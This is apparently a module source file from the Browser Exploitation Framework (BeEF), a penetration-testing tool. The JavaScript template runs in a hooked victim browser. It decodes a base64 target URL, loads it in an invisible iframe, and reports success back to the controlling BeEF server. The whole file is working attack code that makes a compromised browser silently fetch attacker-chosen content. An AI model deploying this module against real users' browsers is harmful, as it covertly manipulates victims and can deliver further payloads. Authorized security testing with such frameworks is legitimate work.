//
// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - https://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

	var target = decodeURIComponent(beef.encode.base64.decode('<%= Base64.strict_encode64(@target) %>'));
	var iframe_<%= @command_id %> = beef.dom.createInvisibleIframe();
	iframe_<%= @command_id %>.setAttribute('src', target);

	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=IFrame created');

});
